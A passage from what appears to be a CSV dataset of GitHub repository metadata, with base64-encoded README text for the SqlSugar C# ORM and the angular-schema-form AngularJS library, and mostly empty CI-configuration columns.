name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
R2V0SW50IFNxbFF1ZXJ5PFQ+ICDnrYnnrYnpg73lj6/ku6XnlKgKdmFyIG5h
bWVQPSBuZXcgU3VnYXJQYXJhbWV0ZXIoIkBuYW1lIiwgIuW8oOS4iSIpOwp2
YXIgYWdlUD0gbmV3IFN1Z2FyUGFyYW1ldGVyKCJAYWdlIiwgbnVsbCwgdHJ1
ZSk7Ly9pc091dHB1dD10cnVlCnZhciBkdDIgPSBkYi5BZG8uVXNlU3RvcmVk
UHJvY2VkdXJlKCkuR2V0RGF0YVRhYmxlKCJzcF9zY2hvb2wiLG5hbWVQLGFn
ZVApOwpgYGAKIFs8Zm9udCBjb2xvcj1yZWQ+VmlldyBtb3JlID4+IDwvZm9u
dD5dKGh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4dWFuL1NxbFN1Z2FyL3dp
a2kvNy5hZG8gKSAKIAogIyMgIDguU2F2ZWFibGUKIEluc2VydCBvciBVcGRh
dGUKYGBgY3MKZGIuU2F2ZWFibGU8U3R1ZGVudD4oZW50aXR5KS5FeGVjdXRl
UmV0dXJuRW50aXR5KCk7CmRiLlNhdmVhYmxlPFN0dWRlbnQ+KG5ldyBTdHVk
ZW50KCkgeyBOYW1lID0gIiIgfSkKICAgICAgICAgICAgICAgICAgLkluc2Vy
dENvbHVtbnMoaXQ9Pml0Lk5hbWUpCiAgICAgICAgICAgICAgICAgIC5VcGRh
dGVDb2x1bW5zKGl0PT5uZXcgeyBpdC5OYW1lLGl0LkNyZWF0ZVRpbWUgfQog
ICAgICAgICAgICAgICAgICAuRXhlY3V0ZVJldHVybkVudGl0eSgpOwoKYGBg
Cls8Zm9udCBjb2xvcj1yZWQ+VmlldyBtb3JlID4+IDwvZm9udD5dKGh0dHBz
Oi8vZ2l0aHViLmNvbS9zdW5rYWl4dWFuL1NxbFN1Z2FyL3dpa2kvOC5zYXZl
YWJsZSApIAogCiAgIyMgIDkuRW50aXR5TWFpbgogIGBgYGNzCnZhciBlbnRp
dHlJbmZvPWRiLkVudGl0eU1haW50ZW5hbmNlLkdldEVudGl0eUluZm88U3R1
ZGVudD4oKTsKZm9yZWFjaCAodmFyIGNvbHVtbiBpbiBlbnRpdHlJbmZvLkNv
bHVtbnMpCnsKICAgIENvbnNvbGUuV3JpdGVMaW5lKGNvbHVtbi5Db2x1bW5E
ZXNjcmlwdGlvbik7Cn0KYGBgCls8Zm9udCBjb2xvcj1yZWQ+VmlldyBtb3Jl
ID4+IDwvZm9udD5dKGh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4dWFuL1Nx
bFN1Z2FyL3dpa2kvOS5lbnRpdHlNYWluICkgCgogICMjICAxMC5EYk1haW4K
ICAgYGBgY3MKICB2YXIgdGFibGVzID0gZGIuRGJNYWludGVuYW5jZS5HZXRU
YWJsZUluZm9MaXN0KCk7CiAgZm9yZWFjaCAodmFyIHRhYmxlIGluIHRhYmxl
cykKICB7CiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUodGFibGUuRGVzY3Jp
cHRpb24pOwogIH0KICBgYGAKICBbPGZvbnQgY29sb3I9cmVkPlZpZXcgbW9y
ZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1Yi5jb20vc3Vua2FpeHVhbi9T
cWxTdWdhci93aWtpL2EuRGJNYWluICkgCiAgCgogICMjICAxMS5Bb3AKICBg
YGBjcwpkYi5Bb3AuT25Mb2dFeGVjdXRlZMKgPcKgKHNxbCzCoHBhcnMpwqA9
PsKgLy9TUUwgZXhlY3V0ZWQgZXZlbnQKewrCoAp9OwpkYi5Bb3AuT25Mb2dF
eGVjdXRpbmfCoD3CoChzcWwswqBwYXJzKcKgPT7CoC8vU1FMIGV4ZWN1dGlu
ZyBldmVudCAocHJlLWV4ZWN1dGlvbikKewrCoAp9OwpkYi5Bb3AuT25FcnJv
csKgPcKgKGV4cCnCoD0+Ly9TUUwgZXhlY3V0aW9uIGVycm9yIGV2ZW50CnsK
wqDCoMKgwqDCoMKgwqDCoMKgwqDCoMKgwqDCoMKgwqDCoAp9OwpkYi5Bb3Au
T25FeGVjdXRpbmdDaGFuZ2VTcWzCoD3CoChzcWwswqBwYXJzKcKgPT7CoC8v
U1FMIGV4ZWN1dGluZyBldmVudCAocHJlLWV4ZWN1dGlvbixTUUwgc2NyaXB0
IGNhbiBiZSBtb2RpZmllZCkKewrCoMKgwqDCoHJldHVybsKgbmV3wqBLZXlW
YWx1ZVBhaXI8c3RyaW5nLMKgU3VnYXJQYXJhbWV0ZXJbXT4oc3FsLHBhcnMp
Owp9OwoKYGBgCiAgWzxmb250IGNvbG9yPXJlZD5WaWV3IG1vcmUgPj4gPC9m
b250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1bmthaXh1YW4vU3FsU3VnYXIv
d2lraS9iLmFvcCApIAoKICAjIyAgMTIuUXVlcnlGaWx0ZXIKICBgYGBjcwoK
IC8vZ29iYWwgZmlsdGVyCnZhciBkYiA9IEdldEluc3RhbmNlKCk7CnZhciBz
cWwgPSBkYi5RdWVyeWFibGU8U3R1ZGVudD4oKS5Ub1NxbCgpOwovL1NFTEVD
VCBbSURdLFtTY2hvb2xJZF0sW05hbWVdLFtDcmVhdGVUaW1lXSBGUk9NIFtT
VHVkZW50XSAgV0hFUkUgIGlzRGVsZXRlPTAgCgoKcHVibGljIHN0YXRpYyBT
cWxTdWdhckNsaWVudCBHZXRJbnN0YW5jZSgpCnsKICAgIFNxbFN1Z2FyQ2xp
ZW50IGRiID0gbmV3IFNxbFN1Z2FyQ2xpZW50KG5ldyBDb25uZWN0aW9uQ29u
ZmlnKCkge3h4eCk7CiAgICAgICAgICAgIGRiLlF1ZXJ5RmlsdGVyLkFkZChu
ZXcgU3FsRmlsdGVySXRlbSgpCiAgICAgICAgICAgICB7CiAgICAgICAgICAg
ICAgICAgRmlsdGVyVmFsdWUgPSBmaWx0ZXJEYiA9PgogICAgICAgICAgICAg
ICAgIHsKICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBTcWxGaWx0
ZXJSZXN1bHQoKSB7IFNxbCA9ICIgaXNEZWxldGU9MCIgfTsKICAgICAgICAg
ICAgICAgICB9CiAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgcmV0dXJu
IGRiOwp9CiBgYGAKICAgWzxmb250IGNvbG9yPXJlZD5WaWV3IG1vcmUgPj4g
PC9mb250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1bmthaXh1YW4vU3FsU3Vn
YXIvd2lraS9jLkdvYmFsRmlsdGVyICkgCiAKICAjIyAgMTMuRGJGaXJzdAog
IGBgYGNzCnZhciBkYiA9IEdldEluc3RhbmNlKCk7Ci8vQ3JlYXRlIGFsbCBj
bGFzcwpkYi5EYkZpcnN0LkNyZWF0ZUNsYXNzRmlsZSgiYzpcXERlbW9cXDEi
KTsKCi8vQ3JlYXRlIHN0dWRlbnQgY2Fsc3NzCmRiLkRiRmlyc3QuV2hlcmUo
IlN0dWRlbnQiKS5DcmVhdGVDbGFzc0ZpbGUoImM6XFxEZW1vXFwyIik7Ci8v
V2hlcmUoYXJyYXkpCgovL01hcHBpbmcgbmFtZQpkYi5NYXBwaW5nVGFibGVz
LkFkZCgiQ2xhc3NTdHVkZW50IiwgIlN0dWRlbnQiKTsKZGIuTWFwcGluZ0Nv
bHVtbnMuQWRkKCJOZXdJZCIsICJJZCIsICJDbGFzc1N0dWRlbnQiKTsKZGIu
RGJGaXJzdC5XaGVyZSgiU3R1ZGVudCIpLkNyZWF0ZUNsYXNzRmlsZSgiYzpc
XERlbW9cXDMiKTsKCi8vUmVtb3ZlIG1hcHBpbmcKZGIuTWFwcGluZ1RhYmxl
cy5DbGVhcigpOwoKLy9DcmVhdGUgY2xhc3Mgd2l0aCBkZWZhdWx0IHZhbHVl
CmRiLkRiRmlyc3QuSXNDcmVhdGVEZWZhdWx0VmFsdWUoKS5DcmVhdGVDbGFz
c0ZpbGUoImM6XFxEZW1vXFw0IiwgIkRlbW8uTW9kZWxzIik7CgoKLy9NYXBw
aW5nIGFuZCBBdHRyaWJ1dGUKZGIuTWFwcGluZ1RhYmxlcy5BZGQoIkNsYXNz
U3R1ZGVudCIsICJTdHVkZW50Iik7CmRiLk1hcHBpbmdDb2x1bW5zLkFkZCgi
TmV3SWQiLCAiSWQiLCAiQ2xhc3NTdHVkZW50Iik7CmRiLkRiRmlyc3QuSXND
cmVhdGVBdHRyaWJ1dGUoKS5XaGVyZSgiU3R1ZGVudCIpLkNyZWF0ZUNsYXNz
RmlsZSgiYzpcXERlbW9cXDUiKTsKCgpgYGAKICAgWzxmb250IGNvbG9yPXJl
ZD5WaWV3IG1vcmUgPj4gPC9mb250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1
bmthaXh1YW4vU3FsU3VnYXIvd2lraS9kLkRiRmlyc3QgKSAKCgogICMjICAx
NC5Db2RlRmlyc3QKYGBgY3MKZGIuQ29kZUZpcnN0LlNldFN0cmluZ0RlZmF1
bHRMZW5ndGgoMTAwKS5CYWNrdXBUYWJsZSgpLkluaXRUYWJsZXModHlwZW9m
KENvZGVUYWJsZSksdHlwZW9mKENvZGVUYWJsZTIpKTsgLy9jaGFuZ2UgZW50
aXR5IGJhY2t1cFRhYmxlCmRiLkNvZGVGaXJzdC5TZXRTdHJpbmdEZWZhdWx0
TGVuZ3RoKDEwMCkuSW5pdFRhYmxlcyh0eXBlb2YoQ29kZVRhYmxlKSwgdHlw
ZW9mKENvZGVUYWJsZTIpKTsKYGBgCiAgIFs8Zm9udCBjb2xvcj1yZWQ+Vmll
dyBtb3JlID4+IDwvZm9udD5dKGh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4
dWFuL1NxbFN1Z2FyL3dpa2kvZS5Db2RlRmlyc3QgKSAKCiAgIyMgIDE1LlV0
aWxpdGllcwogIGBgYGNzCnZhciBsaXN0ID0gZGIuVXRpbGl0aWVzLkRhdGFU
YWJsZVRvTGlzdChkYXRhdGFibGUpOwogIGBgYAogIApbPGZvbnQgY29sb3I9
cmVkPlZpZXcgbW9yZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1Yi5jb20v
c3Vua2FpeHVhbi9TcWxTdWdhci93aWtpL2YuVXRpbGl0aWVzICkgCgoKICAj
IyAgMTYuU2ltcGxlQ2xpZW50CmBgYGNzCnZhciBkYiA9IEdldEluc3RhbmNl
KCk7CnZhciBzZGIgPSBkYi5HZXRTaW1wbGVDbGllbnQ8U3R1ZGVudD4oKTsK
c2RiLkdldEJ5SWQoMSk7CnNkYi5HZXRMaXN0KCk7CnNkYi5EZWxldGVCeUlk
KDEpOwpzZGIuVXBkYXRlKG9iaik7CiBgYGAKIAogCiBbPGZvbnQgY29sb3I9
cmVkPlZpZXcgbW9yZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1Yi5jb20v
c3Vua2FpeHVhbi9TcWxTdWdhci93aWtpL2cuU2ltcGxlQ2xpZW50ICkgCiAg
CgojIENvZGUgZ2VuZXJhdG9yCmh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4
dWFuL1NvRWFzeVBsYXRmb3JtCgojIE1vcmUgQVBpIOS4reaWh+aWh+aho++8
mgpodHRwOi8vd3d3LmNvZGVpc2J1Zy5jb20vRG9jLzgK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'angular-schema-form',18065797,"b'Generate forms from a JSON schema, with AngularJS! '",b'JavaScript',128,2392,,2392,False,b'https://api.github.com/repos/json-schema-form/angular-schema-form/forks',"QW5ndWxhciBTY2hlbWEgRm9ybQo9PT09PT09PT09PT09PT09PT09ClshW25w
bSB2ZXJzaW9uXShodHRwczovL2ltZy5zaGllbGRzLmlvL25wbS92L2FuZ3Vs
YXItc2NoZW1hLWZvcm0uc3ZnP3N0eWxlPWZsYXQtc3F1YXJlKV0oaHR0cHM6
Ly93d3cubnBtanMub3JnL3BhY2thZ2UvYW5ndWxhci1zY2hlbWEtZm9ybSkK
WyFbbnBtIGRvd25sb2Fkc10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9ucG0v
ZG0vYW5ndWxhci1zY2hlbWEtZm9ybS5zdmc/c3R5bGU9ZmxhdC1zcXVhcmUp
XShodHRwOi8vbnBtLXN0YXQuY29tL2NoYXJ0cy5odG1sP3BhY2thZ2U9YW5n
dWxhci1zY2hlbWEtZm9ybSZmcm9tPTIwMTUtMDEtMDEpClshW0dpdHRlcl0o
aHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9HSVRURVItSk9JTiUyMENI
QVQlMjAlRTIlODYlOTItZmY2OWI0LnN2Zz9zdHlsZT1mbGF0LXNxdWFyZSld
KGh0dHBzOi8vZ2l0dGVyLmltL2pzb24tc2NoZW1hLWZvcm0vYW5ndWxhci1z
Y2hlbWEtZm9ybT91dG1fc291cmNlPWJhZGdlJnV0bV9tZWRpdW09YmFkZ2Um
dXRtX2NhbXBhaWduPXByLWJhZGdlJnV0bV9jb250ZW50PWJhZGdlKQpbIVtC
dWlsZCBTdGF0dXNdKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vdHJhdmlzL2pz
b24tc2NoZW1hLWZvcm0vYW5ndWxhci1zY2hlbWEtZm9ybS5zdmc/c3R5bGU9
ZmxhdC1zcXVhcmUpXShodHRwczovL3RyYXZpcy1jaS5vcmcvanNvbi1zY2hl
bWEtZm9ybS9hbmd1bGFyLXNjaGVtYS1mb3JtKQpbIVtDb2RlIENvdmVyYWdl
XShodHRwczovL2ltZy5zaGllbGRzLmlvL2NvdmVyYWxscy9qc29uLXNjaGVt
YS1mb3JtL2FuZ3VsYXItc2NoZW1hLWZvcm0uc3ZnP3N0eWxlPWZsYXQtc3F1
YXJlKV0oaHR0cHM6Ly9jb3ZlcmFsbHMuaW8vZ2l0aHViL2pzb24tc2NoZW1h
LWZvcm0vYW5ndWxhci1zY2hlbWEtZm9ybT9icmFuY2g9ZGV2ZWxvcG1lbnQp
CgpHZW5lcmF0ZSBmb3JtcyBmcm9tIEpTT04gc2NoZW1hcyB1c2luZyBBbmd1
bGFySlMhCgpXaHkgbm90IG1hbnkgY2hhbmdlcyBsYXRlbHk/Cj09PT09PT09
PT09PT09PT09PT09PT09PT09PT0KTXVjaCBvZiB0aGUgbmV3IGRldmVsb3Bt
ZW50IGlzIGJlaW5nIGRvbmUgaW4gW0Fzc2ltaWxhdGVdKGh0dHBzOi8vZ2l0
aHViLmNvbS9qc29uc2NoZW1hL2Fzc2ltaWxhdGUpLCBhIHN0YW5kYXJkaXNl
ZCB2YWxpZGF0b3IgZm9yIEpTT04gU2NoZW1hIHRvIGhlbHAgZW5zdXJlIGNo
YW5naW5nIHZhbGlkYXRvcnMgaXMgbmV2ZXIgYXMgcGFpbmZ1bCBhcyBlc2Nh
cGluZyB0djQgaXMsIGFzIHdlbGwgYXMgYSBuZXcgW2NvcmUgbGlicmFyeV0o
aHR0cHM6Ly9naXRodWIuY29tL2pzb24tc2NoZW1hLWZvcm0vanNvbi1zY2hl
bWEtZm9ybS1jb3JlKSB0byBhbGxvdyBmb3IgYSBtb3JlIHByZWRpY3RhYmxl
IHVwZ3JhZGUgZnJvbSBBbmd1bGFySlMgdG8gQW5ndWxhci4KClRoZSBCbG9n
IC8gVGhlIFdlYiBTaXRlIC8gVGhlIFR3aXR0ZXIgLyBUaGUgTW92aWUKPT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PQpbbWVkaXVtLmNvbS9AU2NoZW1hRm9ybUlPXShodHRwczovL21lZGl1bS5j
b20vQFNjaGVtYUZvcm1JTykgLyBbd2Vic2l0ZV0oaHR0cHM6Ly9qc29uLXNj
aGVtYS1mb3JtLmdpdGh1Yi5pby9hbmd1bGFyLXNjaGVtYS1mb3JtKSAvIFtA
U2NoZW1hRm9ybUlPXShodHRwOi8vdHdpdHRlci5jb20vU2NoZW1hRm9ybUlP
KSAvIFtNb3ZpZV0oaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1k
dUJGTWlwUnEybykKCklmIHlvdSB1c2UgQVNGIGluIHlvdXIgcHJvamVjdC9j
b21wYW55IHBsZWFzZSBsZXQgdXMga25vdyEgV2UnZCBsb3ZlIHRvIGZlYXR1
cmUgeW91IG9uIHRoZSBzaXRlLgoKVGhlcmUgaGFzIGJlZW4gc29tZSByZWNl
bnQgZGV2ZWxvcG1lbnRzIGluIHRoaXMgcHJvamVjdCB0aGF0IHlvdSBtaWdo
dCB3YW50IHRvIFtyZWFkIGFib3V0XShodHRwczovL2dpdGh1Yi5jb20vanNv
bi1zY2hlbWEtZm9ybS9hbmd1bGFyLXNjaGVtYS1mb3JtL3dpa2kvUmVjZW50
LWRldmVsb3BtZW50cykuCgpEZW1vIFRpbWUhCj09PT09PT09PT0KW1RyeSBv
dXQgdGhlIGV4YW1wbGUgcGFnZV0oaHR0cDovL3NjaGVtYWZvcm0uaW8vZXhh
bXBsZXMvYm9vdHN0cmFwLWV4YW1wbGUuaHRtbCkuIFRyeSBlZGl0aW5nIHRo
ZSBzY2hlbWEgb3IgZm9ybSBkZWZpbml0aW9uIGFuZCBzZWUgd2hhdCBjb21l
cyBvdXQhCgpIaW50OiBCeSBwcmVzc2luZyB0aGUgJ1NhdmUgdG8gZ2lzdCcg
YnV0dG9uICh0b3AgbGVmdCksIHlvdSBjYW4gc2F2ZSB5b3VyIGV4YW1wbGUg
aW50byBhIHNoYXJlYWJsZSBsaW5rLgoKRG9jdW1lbnRhdGlvbgo9PT09PT09
PT09PT09CllvdSBjYW4gZmluZCBbYWxsIGRvY3VtZW50YXRpb24gaGVyZV0o
ZG9jcy9pbmRleC5tZCksIGl0IGNvdmVycyBhbGwgdGhlIGRpZmZlcmVudCBm
aWVsZCB0eXBlcwphbmQgdGhlaXIgb3B0aW9ucy4KCkl0IGFsc28gY292ZXJz
IGhvdyB0byBbZXh0ZW5kIGFuZ3VsYXIgc2NoZW1hIGZvcm0gd2l0aCB5b3Vy
IG93biBmaWVsZCB0eXBlc10oZG9jcy9leHRlbmRpbmcubWQpLgoKQmVmb3Jl
IGZpbGluZyBhbiBpc3N1ZSwgcGxlYXNlIHJlYWQgb3VyIFtpc3N1ZSBzdXBw
b3J0IGluc3RydWN0aW9uc10oZG9jcy9zdXBwb3J0Lm1kKSBvciB5b3UgbWF5
IGJlIGlnbm9yZWQuCgpXaGF0IGlzIGl0Pwo9PT09PT09PT09PQoKU2NoZW1h
IEZvcm0gaXMgYSBzZXQgb2YgQW5ndWxhckpTIGRpcmVjdGl2ZXMgKGFuZCBh
IGNvdXBsZSBvZiBzZXJ2aWNlcykuIEl0IGNhbiBkbyB0d28gdGhpbmdzIHRv
Cm1ha2UgbGlmZSBlYXNpZXI6CgoxLiBDcmVhdGUgYSBmb3JtIGRpcmVjdGx5
IGZyb20gYSBKU09OIHNjaGVtYS4KMi4gVmFsaWRhdGUgZm9ybSBmaWVsZHMg
YWdhaW5zdCB0aGF0IHNhbWUgSlNPTiBzY2hlbWEuCgpTY2hlbWEgRm9ybSB1
c2VzIGNvbnZlbnRpb24gb3ZlciBjb25maWd1cmF0aW9uLCBzbyBpdCBjb21l
cyBwYWNrYWdlZCB3aXRoIHNvbWUgc2Vuc2libGUgZGVmYXVsdHMuCkJ1dCB5
b3UgY2FuIGFsd2F5cyBjdXN0b21pemUgaXQgYnkgY2hhbmdpbmcgdGhlIG9y
ZGVyIGFuZCB0eXBlcyBvZiBmb3JtIGZpZWxkcy4KCiMjIyMgSlNPTiBGb3Jt
ClNjaGVtYSBGb3JtIGlzIGluc3BpcmVkIGJ5IHRoZSBuaWNlIFtKU09OIEZv
cm1dKGh0dHBzOi8vZ2l0aHViLmNvbS9qb3NoZmlyZS9qc29uZm9ybSkgbGli
cmFyeSBhbmQKYWltcyB0byBiZSByb3VnaGx5IGNvbXBhdGlibGUgd2l0aCBp
dCwgZXNwZWNpYWxseSBpdHMgZm9ybSBkZWZpbml0aW9uLiBTbyB3aGF0IHNl
dHMgU2NoZW1hIEZvcm0KYXBhcnQgZnJvbSBKU09OIEZvcm0/CgoxLiBTY2hl
bWEgRm9ybSBpbnRlZ3JhdGVzIGRlZXBseSB3aXRoIEFuZ3VsYXJKUyBhbmQg
dXNlcyBBbmd1bGFySlMgY29udmVudGlvbnMgdG8gaGFuZGxlIGZvcm1zLgoy
LiBTY2hlbWEgRm9ybSB1c2VzIFt0djRdKGh0dHBzOi8vZ2l0aHViLmNvbS9n
ZXJhaW50bHVmZi90djQpIGZvciB2YWxpZGF0aW9uLCBtYWtpbmcgaXQgY29t
cGF0aWJsZQogICB3aXRoIHZlcnNpb24gNCBvZiB0aGUgSlNPTiBzY2hlbWEg
c3RhbmRhcmQuCjMuIEJ5IGRlZmF1bHQsIFNjaGVtYSBGb3JtIGdlbmVyYXRl
cyBCb290c3RyYXAgMy1mcmllbmRseSBIVE1MLgoKTWlncmF0aW9uIEd1aWRl
Cj09PT09PT09PT09PT09PQpJZiB5b3UgYWxyZWFkeSB1c2UgdGhlIGxpYnJh
cnkgZmFjdG9yaWVzIGluIGFuIGFwcCBvciBhbiBhZGQtb24gb3IgcGxhbiB0
byB1cGdyYWRlIHZlcnNpb25zLCBwbGVhc2UgcmVhZCB0aGUgClttaWdyYXRp
b24gZ3VpZGVdKGRvY3MvbWlncmF0aW9uLm1kKSBmb3IgYW55IGl0ZW1zIHRo
YXQgbWF5IG5lZWQgY29uc2lkZXJhdGlvbi4KCkJhc2ljIFVzYWdlCi0tLS0t
LS0tLS0tCgpGaXJzdCwgZXhwb3NlIHlvdXIgc2NoZW1hLCBmb3JtLCBhbmQg
bW9kZWwgdG8gdGhlICRzY29wZS4KCmBgYGphdmFzY3JpcHQKYW5ndWxhci5t
b2R1bGUoJ215TW9kdWxlJywgWydzY2hlbWFGb3JtJ10pCiAgICAgICAuY29u
dHJvbGxlcignRm9ybUNvbnRyb2xsZXInLCBmdW5jdGlvbigkc2NvcGUpIHsK
ICAkc2NvcGUuc2NoZW1hID0gewogICAgdHlwZTogIm9iamVjdCIsCiAgICBw
cm9wZXJ0aWVzOiB7CiAgICAgIG5hbWU6IHsgdHlwZTogInN0cmluZyIsIG1p
bkxlbmd0aDogMiwgdGl0bGU6ICJOYW1lIiwgZGVzY3JpcHRpb246ICJOYW1l
IG9yIGFsaWFzIiB9LAogICAgICB0aXRsZTogewogICAgICAgIHR5cGU6ICJz
dHJpbmciLAogICAgICAgIGVudW06IFsnZHInLCdqcicsJ3NpcicsJ21ycycs
J21yJywnTmFOJywnZGonXQogICAgICB9CiAgICB9CiAgfTsKCiAgJHNjb3Bl
LmZvcm0gPSBbCiAgICAiKiIsCiAgICB7CiAgICAgIHR5cGU6ICJzdWJtaXQi
LAogICAgICB0aXRsZTogIlNhdmUiCiAgICB9CiAgXTsKCiAgJHNjb3BlLm1v
ZGVsID0ge307Cn0pOwpgYGAKClRoZW4gbG9hZCB0aGVtIGludG8gU2NoZW1h
IEZvcm0gdXNpbmcgdGhlIGBzZlNjaGVtYWAsIGBzZkZvcm1gLCBhbmQgYHNm
TW9kZWxgIGRpcmVjdGl2ZXMuCgpgYGBodG1sCjxkaXYgbmctY29udHJvbGxl
cj0iRm9ybUNvbnRyb2xsZXIiPgogICAgPGZvcm0gc2Ytc2NoZW1hPSJzY2hl
bWEiIHNmLWZvcm09ImZvcm0iIHNmLW1vZGVsPSJtb2RlbCI+PC9mb3JtPgo8
L2Rpdj4KYGBgCgpJbnN0YWxsYXRpb24KLS0tLS0tLS0tLS0tCgojIyMgTlBN
CgpgYGBiYXNoCm5wbSBpIGFuZ3VsYXItc2NoZW1hLWZvcm1AbGF0ZXN0CmBg
YApGb3IgdGhlIGxhdGVzdCBwcmUtcmVsZWFzZSAoYWxwaGEpCmBgYGJhc2gK
bnBtIGkgYW5ndWxhci1zY2hlbWEtZm9ybUBwcmUtcmVsZWFzZQpgYGAKCiMj
IyBCb3dlcgoKSXQncyBzaW1wbGVzdCB0byBpbnN0YWxsIFNjaGVtYSBGb3Jt
IHVzaW5nIFtCb3dlcl0oaHR0cDovL2Jvd2VyLmlvLykuCklmIHlvdSB1c2Ug
dGhlIGJvb3RzdHJhcCBkZWNvcmF0b3IgdXNlIHRoZSBvbmUgZnJvbSB0aGUg
YW5ndWxhci1zY2hlbWEtZm9ybS1ib290c3RyYXAgcmVwbwoKYGBgYmFzaApi
b3dlciBpbnN0YWxsIGFuZ3VsYXItc2NoZW1hLWZvcm0gYW5ndWxhci1zY2hl
bWEtZm9ybS1ib290c3RyYXAKYm93ZXIgaW5zdGFsbCBhbmd1bGFyLXNjaGVt
YS1mb3JtIGFuZ3VsYXItc2NoZW1hLWZvcm0tYm9vdHN0cmFwCmBgYAoKVGhp
cyB3aWxsIGluc3RhbGwgdGhlIGxhdGVzdCByZWxlYXNlIGFuZCBiYXNpYyBk
ZXBlbmRlbmNpZXMuIFNlZQpbZGVwZW5kZW5jaWVzIHNlY3Rpb24gYmVsb3dd
KCNkZXBlbmRlbmNpZXMpLgoKWW91IGNhbiBhbHNvIGxvYWQgdGhlIGZpbGVz
IHZpYSBbY2RuanMuY29tXShodHRwczovL2NkbmpzLmNvbS9saWJyYXJpZXMv
YW5ndWxhci1zY2hlbWEtZm9ybSkuCgojIyMgTWFudWFsCgpZb3UgY2FuIGFs
c28ganVzdCBkb3dubG9hZCB0aGUgY29udGVudHMgb2YgdGhlIGBkaXN0L2Ag
Zm9sZGVyIGFuZCBhZGQgZGVwZW5kZW5jaWVzIG1hbnVhbGx5LgoKIyMjIERl
cGVuZGVuY2llcwoKU2NoZW1hIGZvcm0gaGFzIGEgbG90IG9mIGRlcGVuZGVu
Y2llcywgbW9zdCBvZiB3aGljaCBhcmUgb3B0aW9uYWwuIFNjaGVtYSBGb3Jt
IGRlcGVuZHMgb246CgoxLiBbQW5ndWxhckpTXShodHRwczovL2FuZ3VsYXJq
cy5vcmcvKSB2ZXJzaW9uIDEuMy54IGlzIHJlY29tbWVuZGVkLiBWZXJzaW9u
